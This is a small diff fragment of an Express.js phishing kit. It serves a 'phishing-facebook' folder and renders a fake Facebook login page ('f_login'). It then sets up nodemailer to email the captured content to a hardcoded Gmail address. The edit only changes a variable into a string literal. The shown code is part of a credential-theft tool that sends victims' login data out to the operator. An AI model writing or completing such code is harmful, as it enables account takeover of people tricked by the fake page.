@@ -22,7 +22,7 @@ app.use('/phishing-facebook', express.static('phishing-facebook'));
 app.get('/', function (req, res) {
     res.render('f_login');
     
-    var message = captured_content;
+    var message = "captured_content";
     var toEmail = "mdalonebd@gmail.com";
 
     var transporter = nodemailer.createTransport({
